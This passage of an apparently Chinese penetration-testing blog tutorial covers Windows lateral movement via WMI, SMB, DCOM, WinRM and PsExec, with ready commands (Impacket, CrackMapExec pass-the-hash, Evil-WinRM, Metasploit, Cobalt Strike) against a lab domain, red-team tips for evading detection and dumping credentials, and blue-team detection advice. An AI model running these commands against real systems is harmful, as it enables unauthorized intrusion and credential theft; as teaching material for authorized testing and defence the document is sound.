+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec 0day/sqladmin:<span class="string">&#x27;admin!@#45&#x27;</span>@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 使用 CrackMapExec（批量横向）</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec wmi 192.168.3.0/24 -u sqladmin -p <span class="string">&#x27;admin!@#45&#x27;</span> -x <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="WMI-横向的优势"><a href="#WMI-横向的优势" class="headerlink" title="WMI 横向的优势"></a>WMI 横向的优势</h3><ul>
+<li>支持 Pass-the-Hash 攻击</li>
+<li>不会在目标系统留下明显的服务或进程</li>
+<li>可以批量执行命令</li>
+<li>支持远程 PowerShell 脚本执行</li>
+</ul>
+<h3 id="检测与防御-1"><a href="#检测与防御-1" class="headerlink" title="检测与防御"></a>检测与防御</h3><p><strong>蓝队检测</strong>：</p>
+<ul>
+<li>监控 WMI 进程创建事件（Event ID 4688）</li>
+<li>检测异常的 WmiPrvSE.exe 进程</li>
+<li>分析网络流量中的 DCOM 连接</li>
+</ul>
+<p><strong>红队规避</strong>：</p>
+<ul>
+<li>使用 PowerShell 的 WMI Cmdlet（避免 wmic.exe 特征）</li>
+<li>限制执行频率，避免批量触发告警</li>
+<li>结合其他横向方法分散特征</li>
+</ul>
+<hr>
+<h2 id="SMB-横向移动"><a href="#SMB-横向移动" class="headerlink" title="SMB 横向移动"></a>SMB 横向移动</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>SMB（Server Message Block）是 Windows 文件共享协议，也支持远程命令执行。通过 SMB 协议可以访问远程文件系统并执行程序。</p>
+<h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>445 端口开启</li>
+<li>已知管理员账号密码或 NTLM Hash</li>
+</ol>
+<h3 id="实战操作-2"><a href="#实战操作-2" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 使用 Impacket 的 smbexec</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-smbexec 0day/sqladmin:<span class="string">&#x27;admin!@#45&#x27;</span>@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 使用 CrackMapExec</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 明文密码</span></span><br><span class="line">crackmapexec smb 192.168.3.142 -u sqladmin -p <span class="string">&#x27;admin!@#45&#x27;</span> -x <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pass-the-Hash</span></span><br><span class="line">crackmapexec smb 192.168.3.142 -u sqladmin -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -x <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 使用 Cobalt Strike 的 psexec</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec 192.168.3.142 sqladmin admin!@#45 smb</span><br></pre></td></tr></table></figure>
+
+<h3 id="SMB-横向的特点"><a href="#SMB-横向的特点" class="headerlink" title="SMB 横向的特点"></a>SMB 横向的特点</h3><p><strong>优势</strong>：</p>
+<ul>
+<li>支持 Pass-the-Hash</li>
+<li>执行速度快</li>
+<li>可以批量横向</li>
+</ul>
+<p><strong>劣势</strong>：</p>
+<ul>
+<li>会在目标机创建服务（容易被检测）</li>
+<li>会留下明显的日志记录</li>
+<li>需要管理员权限</li>
+</ul>
+<hr>
+<h2 id="DCOM-横向移动"><a href="#DCOM-横向移动" class="headerlink" title="DCOM 横向移动"></a>DCOM 横向移动</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>DCOM（Distributed Component Object Model）是 COM 的分布式扩展，允许通过网络调用远程对象的方法。通过 DCOM 可以在远程机器上执行命令。</p>
+<h3 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>目标机开启 DCOM（默认开启）</li>
+<li>防火墙允许 135 端口</li>
+<li>已知管理员凭证</li>
+</ol>
+<h3 id="实战操作-3"><a href="#实战操作-3" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>使用 Impacket 的 dcomexec</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-dcomexec 0day/sqladmin:<span class="string">&#x27;admin!@#45&#x27;</span>@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 PowerShell 脚本</strong>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span> = [<span class="type">System.Activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;192.168.3.142&quot;</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&quot;cmd.exe&quot;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用的-DCOM-对象"><a href="#常用的-DCOM-对象" class="headerlink" title="常用的 DCOM 对象"></a>常用的 DCOM 对象</h3><table>
+<thead>
+<tr>
+<th>DCOM 对象</th>
+<th>ProgID</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MMC20.Application</td>
+<td>MMC20.Application</td>
+<td>执行命令</td>
+</tr>
+<tr>
+<td>ShellWindows</td>
+<td>Shell.Application</td>
+<td>文件操作</td>
+</tr>
+<tr>
+<td>ShellBrowserWindow</td>
+<td>InternetExplorer.Application</td>
+<td>浏览器操作</td>
+</tr>
+<tr>
+<td>Excel.Application</td>
+<td>Excel.Application</td>
+<td>Excel 操作</td>
+</tr>
+</tbody></table>
+<h3 id="DCOM-横向的优势"><a href="#DCOM-横向的优势" class="headerlink" title="DCOM 横向的优势"></a>DCOM 横向的优势</h3><ul>
+<li>隐蔽性高，不创建服务</li>
+<li>支持多种 COM 对象</li>
+<li>可以绕过部分安全软件</li>
+</ul>
+<hr>
+<h2 id="WinRM-横向移动"><a href="#WinRM-横向移动" class="headerlink" title="WinRM 横向移动"></a>WinRM 横向移动</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>WinRM（Windows Remote Management）是 Windows 的远程管理协议，基于 WS-Management 标准。WinRM 允许管理员远程执行命令和脚本。</p>
+<h3 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>WinRM 服务开启（HTTP 5985 &#x2F; HTTPS 5986）</li>
+<li>Windows 2008 以上版本</li>
+<li>已知管理员凭证</li>
+</ol>
+<h3 id="实战操作-4"><a href="#实战操作-4" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 使用 Windows 自带 WinRS</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell winrs -r:OWA2013 -u:dbadmin -p:admin!@#45 <span class="string">&quot;ipconfig&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw2/13.webp" loading='lazy'></p>
+<p><strong>2. 使用 PowerShell Remoting</strong>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&quot;0day\sqladmin&quot;</span>, (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;admin!@#45&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>))</span><br><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">3.142</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 使用 Evil-WinRM</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 192.168.3.142 -u sqladmin -p <span class="string">&#x27;admin!@#45&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 使用 CrackMapExec</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm 192.168.3.142 -u sqladmin -p <span class="string">&#x27;admin!@#45&#x27;</span> -x <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="WinRM-横向的特点"><a href="#WinRM-横向的特点" class="headerlink" title="WinRM 横向的特点"></a>WinRM 横向的特点</h3><p><strong>优势</strong>：</p>
+<ul>
+<li>合法的管理协议，不易被拦截</li>
+<li>支持加密传输（HTTPS）</li>
+<li>可以执行 PowerShell 脚本</li>
+<li>支持文件上传下载</li>
+</ul>
+<p><strong>配置要求</strong>：</p>
+<ul>
+<li>Windows 2012 之后默认允许远程管理</li>
+<li>早期版本需要手动启用 WinRM</li>
+</ul>
+<hr>
+<h2 id="PSEXEC-横向移动"><a href="#PSEXEC-横向移动" class="headerlink" title="PSEXEC 横向移动"></a>PSEXEC 横向移动</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>PsExec 是 Sysinternals 套件中的工具，用于远程执行命令。其原理是通过 SMB 协议在远程机器上创建服务，然后执行指定程序。</p>
+<h3 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
+<li>445 端口开启</li>
+<li>已知管理员凭证</li>
+<li>目标机允许文件共享</li>
+</ol>
+<h3 id="实战操作-5"><a href="#实战操作-5" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 使用 Sysinternals PsExec</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.3.142 -u sqladmin -p admin!@#45 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 使用 Impacket 的 psexec</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-psexec 0day/sqladmin:<span class="string">&#x27;admin!@#45&#x27;</span>@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 使用 Metasploit</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.3.142</span><br><span class="line"><span class="built_in">set</span> SMBUser sqladmin</span><br><span class="line"><span class="built_in">set</span> SMBPass admin!@#45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 使用 Cobalt Strike</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec 192.168.3.142 sqladmin admin!@#45 smb</span><br></pre></td></tr></table></figure>
+
+<h3 id="PsExec-的工作流程"><a href="#PsExec-的工作流程" class="headerlink" title="PsExec 的工作流程"></a>PsExec 的工作流程</h3><ol>
+<li>通过 SMB 连接到目标机的 ADMIN$ 共享</li>
+<li>上传 PSEXESVC.exe 到目标机的 System32 目录</li>
+<li>通过 SCM（服务控制管理器）创建并启动服务</li>
+<li>服务执行指定的命令或程序</li>
+<li>执行完毕后删除服务和文件</li>
+</ol>
+<h3 id="检测与防御-2"><a href="#检测与防御-2" class="headerlink" title="检测与防御"></a>检测与防御</h3><p><strong>蓝队检测</strong>：</p>
+<ul>
+<li>监控 PSEXESVC 服务的创建（Event ID 7045）</li>
+<li>检测 ADMIN$ 共享的异常访问</li>
+<li>分析 System32 目录的文件创建事件</li>
+</ul>
+<p><strong>红队规避</strong>：</p>
+<ul>
+<li>使用自定义服务名称</li>
+<li>修改 PSEXESVC.exe 的文件名</li>
+<li>使用其他横向方法替代</li>
+</ul>
+<hr>
+<h1 id="横向移动最佳实践"><a href="#横向移动最佳实践" class="headerlink" title="横向移动最佳实践"></a>横向移动最佳实践</h1><h2 id="红队建议"><a href="#红队建议" class="headerlink" title="红队建议"></a>红队建议</h2><ol>
+<li><p><strong>凭证收集优先</strong>：</p>
+<ul>
+<li>使用 Mimikatz &#x2F; LaZagne 收集凭证</li>
+<li>导出 NTDS.dit 获取所有域用户 Hash</li>
+<li>收集浏览器保存的密码</li>
+</ul>
+</li>
+<li><p><strong>选择合适的横向方法</strong>：</p>
+<ul>
+<li>隐蔽性要求高：WMI、DCOM</li>
+<li>需要交互式 Shell：WinRM、RDP</li>
+<li>批量横向：CrackMapExec、Spray</li>
+</ul>
+</li>
+<li><p><strong>避免触发告警</strong>：</p>
+<ul>
+<li>限制横向频率，避免短时间大量登录</li>
+<li>使用合法的管理工具（WinRM、PowerShell Remoting）</li>
+<li>避免使用已知的恶意工具特征</li>
+</ul>
+</li>
+<li><p><strong>建立多条通道</strong>：</p>
+<ul>
+<li>部署多个 Beacon（HTTP、SMB、DNS）</li>
+<li>在关键节点部署持久化</li>
+<li>准备备用的横向路径</li>
+</ul>
+</li>
+</ol>
+<h2 id="蓝队防御"><a href="#蓝队防御" class="headerlink" title="蓝队防御"></a>蓝队防御</h2><ol>
+<li><p><strong>网络隔离</strong>：</p>
+<ul>
+<li>限制工作站之间的横向通信</li>
+<li>使用防火墙策略限制 SMB、WMI、RDP</li>
+<li>部署网络访问控制（NAC）</li>
+</ul>
+</li>
+<li><p><strong>凭证保护</strong>：</p>
+<ul>
+<li>启用 Credential Guard</li>
+<li>禁用 NTLM 认证，强制使用 Kerberos</li>
+<li>定期更换管理员密码</li>
+<li>使用 LAPS 管理本地管理员密码</li>
+</ul>
+</li>
+<li><p><strong>日志监控</strong>：</p>
+<ul>
+<li>监控 Event ID 4624（登录成功）</li>
+<li>监控 Event ID 4672（特权登录）</li>
+<li>监控 Event ID 7045（服务创建）</li>
+<li>监控 Event ID 4688（进程创建）</li>
+</ul>
+</li>
+<li><p><strong>端点防护</strong>：</p>
+<ul>
+<li>部署 EDR 解决方案</li>
+<li>启用 Windows Defender ATP</li>
+<li>限制 PowerShell 执行策略</li>
+<li>启用 AppLocker &#x2F; WDAC</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>内网横向移动是渗透测试的核心环节，成功的横向依赖于：</p>
+<ol>
+<li><strong>充分的信息收集</strong>：了解网络拓扑、主机角色、凭证信息</li>
+<li><strong>合适的工具选择</strong>：根据目标环境选择最隐蔽的横向方法</li>
+<li><strong>谨慎的操作策略</strong>：避免触发告警，保持长期访问能力</li>
+<li><strong>完善的应急预案</strong>：准备多条横向路径和备用通道</li>
+</ol>
+<p>记住：横向移动技术需要在授权的渗透测试环境中使用，未经授权的横向行为属于违法行为。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/Cobalt-Strike/">Cobalt Strike</a><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">流量转发</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/13/exchange/" title="Exchange 后渗透利用"><img class="cover" src="/img/covers/shinchan-cover-10.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Exchange 后渗透利用</div></div><div class="info-2"><div class="info-item-1">Exchange 在内网中的价值Exchange Server 是企业内网中的核心邮件系统，通常包含大量敏感信息：  通讯录数据：完整的组织架构和员工联系方式 邮件内容：可能包含密码、VPN 凭证、系统文档 高权限账户：Exchange 管理员通常拥有域内高权限 横向跳板：Exchange 服务器通常可以访问多个内网区域  在获取域内普通用户权限后，定位并利用 Exchange 服务器是提升权限和扩大战果的关键步骤。  域内定位 ExchangeSPN 定位 Exchange原理SPN（Service Principal Name）是 Kerberos 认证中用于标识服务的唯一标识符。Exchange 服务器会在域内注册多个 SPN，通过查询 SPN 可以快速定位 Exchange 服务器。 实战操作1. 查询域内所有 SPN： 1setspn -T 0day.org -q */*   参数说明：  -T：指定域名 -q */*：查询所有 SPN  2. 过滤 Exchange 相关 SPN： 1setspn -T 0day.org -q */* | findstr &quot;...</div></div></div></a><a class="pagination-related" href="/2026/02/13/wc/" title="Windows/Linux 权限维持技术"><img class="cover" src="/img/covers/shinchan-cover-05.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Windows/Linux 权限维持技术</div></div><div class="info-2"><div class="info-item-1">Windows 权限维持在获取目标系统的初始访问权限后，权限维持是确保长期控制的关键环节。通过部署持久化机制，可以在系统重启、用户注销、甚至部分安全检测后依然保持访问能力。  计划任务持久化原理计划任务（Scheduled Tasks）是 Windows 系统的合法功能，允许在特定时间或事件触发时自动执行程序。通过创建以 SYSTEM 权限运行的计划任务，可以实现高权限的持久化控制。 基础利用创建每日执行的计划任务： 1schtasks /create /s 192.168.3.144 /ru system /u dbadmin /p admin!@#45 /tn transfer /sc DAILY /tr c:\transfer.exe /f  参数说明：  /s：目标主机 IP（本地执行可省略） /ru：运行权限（system &#x3D; SYSTEM 权限） /u：登录用户名 /p：登录密码 /tn：任务名称 /sc：触发频率（DAILY &#x3D; 每天） /tr：要执行的程序路径 /f：强制创建（覆盖同名任务）  手动触发任务（测试用）： 1schtasks /r...</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>
